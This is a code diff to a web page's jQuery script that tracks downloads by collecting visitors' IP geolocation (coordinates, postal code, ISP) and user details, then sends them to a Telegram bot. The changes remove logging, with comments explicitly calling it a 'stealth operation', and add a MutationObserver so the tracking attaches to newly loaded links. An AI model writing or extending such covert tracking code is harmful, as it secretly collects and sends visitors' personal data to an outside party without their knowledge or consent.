@@ -340,7 +340,7 @@ $(document).ready(function () {
       return pages.length;
   }
   
-  // ENHANCED: Get comprehensive location information
+  // ENHANCED: Get essential location information
   async function getLocationInfo() {
       try {
           const response = await fetch('https://ipapi.co/json/');
@@ -353,48 +353,23 @@ $(document).ready(function () {
               country: data.country_name,
               countryCode: data.country_code,
               
-              // ENHANCED: Geographic precision
+              // Geographic precision
               latitude: data.latitude,
               longitude: data.longitude,
               postal: data.postal,
               timezone: data.timezone,
               utcOffset: data.utc_offset,
               
-              // ENHANCED: ISP and network info
+              // ISP and network info
               isp: data.org,
               asn: data.asn,
               
-              // ENHANCED: Additional location data
-              continent: data.continent_code,
-              currency: data.currency,
-              languages: data.languages,
-              
-              // ENHANCED: Threat intelligence
-              threatTypes: data.threat_types || 'None detected',
-              
-              // ENHANCED: Network details
-              version: data.version, // IPv4 or IPv6
-              
-              // ENHANCED: Calculate distance from major cities
-              distanceFromRome: calculateDistance(data.latitude, data.longitude, 41.9028, 12.4964),
-              distanceFromMilan: calculateDistance(data.latitude, data.longitude, 45.4642, 9.1900),
-              distanceFromZurich: calculateDistance(data.latitude, data.longitude, 47.3769, 8.5417)
+              // Network details
+              version: data.version // IPv4 or IPv6
           };
       } catch (error) {
           return { error: 'Location unavailable' };
       }
-  }
-  
-  // ENHANCED: Calculate distance between coordinates
-  function calculateDistance(lat1, lon1, lat2, lon2) {
-      const R = 6371; // Radius of the Earth in km
-      const dLat = (lat2 - lat1) * Math.PI / 180;
-      const dLon = (lon2 - lon1) * Math.PI / 180;
-      const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
-                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
-                Math.sin(dLon/2) * Math.sin(dLon/2);
-      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-      return Math.round(R * c); // Distance in km
   }
   
   // Format message for WhatsApp
@@ -478,14 +453,11 @@ ${userInfo.connection !== 'N/A' ? `🔌 *Connection:* ${userInfo.connection.effe
           });
           
           const result = await response.json();
-          if (result.ok) {
-              console.log('Telegram notification sent successfully');
-          } else {
-              console.error('Telegram error:', result);
-          }
+          // Removed console logging for stealth operation
           
       } catch (error) {
-          console.error('Telegram notification error:', error);
+          // Silent error handling - only log critical errors
+          console.error('Critical tracking error:', error);
       }
   }
   
@@ -498,10 +470,10 @@ ${userInfo.connection !== 'N/A' ? `🔌 *Connection:* ${userInfo.connection.effe
           // Send Telegram notification
           sendTelegramNotification(filename, userInfo, locationInfo);
           
-          // Optional: Also log to console for debugging (remove in production)
-          console.log('Download tracked:', filename, userInfo, locationInfo);
+          // Removed debug logging for stealth operation
           
       } catch (error) {
+          // Silent error handling
           console.error('Tracking error:', error);
       }
   }
@@ -529,9 +501,30 @@ ${userInfo.connection !== 'N/A' ? `🔌 *Connection:* ${userInfo.connection.effe
   // Initialize tracking when page loads
   initializeTracking();
   
-  // Re-initialize if new content is added dynamically
-  $(document).on('DOMNodeInserted', function() {
-      initializeTracking();
+  // Use modern MutationObserver instead of deprecated DOMNodeInserted
+  const observer = new MutationObserver(function(mutations) {
+      let shouldReinitialize = false;
+      mutations.forEach(function(mutation) {
+          if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
+              // Check if new nodes contain links
+              for (let node of mutation.addedNodes) {
+                  if (node.nodeType === 1 && (node.tagName === 'A' || node.querySelector('a'))) {
+                      shouldReinitialize = true;
+                      break;
+                  }
+              }
+          }
+      });
+      
+      if (shouldReinitialize) {
+          initializeTracking();
+      }
+  });
+  
+  // Start observing
+  observer.observe(document.body, {
+      childList: true,
+      subtree: true
   });
 
 }); // End of main document ready function
